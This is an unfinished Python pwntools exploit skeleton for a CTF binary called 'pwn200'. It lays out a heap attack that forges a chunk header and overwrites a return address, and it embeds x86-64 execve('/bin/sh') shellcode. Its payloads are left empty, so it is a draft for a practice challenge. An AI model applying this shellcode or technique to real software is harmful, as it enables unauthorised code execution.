#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn200_patched")
libc = ELF("./libc6_2.24-9ubuntu2_amd64.so")
ld = ELF("./ld-2.24.so")

context.binary = exe
context.log_level = 'debug'

bp = [
    #'0x400b2f', #ISCC_main
    #'0x400a87', #hotel
    #'0x400a28'  #return
]

r = process([exe.path])
script = ['b* ' + i for i in bp]
gdb.attach(r, '\n'.join(script))

def ISCC_input(buffer, id):
    r.sendafter(b'who are u?\n', buffer)
    data = r.recvuntil(b', welcome', drop=True)

    r.sendlineafter(b'give me your id ~~?', str(id).encode())
    return data

def hotel_input(buffer):
    r.sendafter(b'give me money~', buffer)

def alloc(size, data):
    r.sendlineafter(b'your choice : ', b'1')
    r.sendlineafter(b'how long?', str(size).encode())
    r.sendafter(b'give me more money : ', data)

def free():
    r.sendlineafter(b'your choice : ', b'2')

shellcode =b'\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05'

def main():

    #ISCC_main: leak rbp address and construct fake next_header
    #data = ISCC_input()

    pause()
    #hotel: make fake header and overwrite the chunk_ptr
    #chunk_ptr = 
    payload = flat( #0x38 + 0x8


    )
    hotel_input(payload)

    pause()
    #free_and_alloc: overwrite return address to shellcode
    #shellcode_location =
    #size =
    payload = flat(
 
    )

    free()

    pause()
    alloc(size, payload)

    r.interactive()


if __name__ == "__main__":
    main()
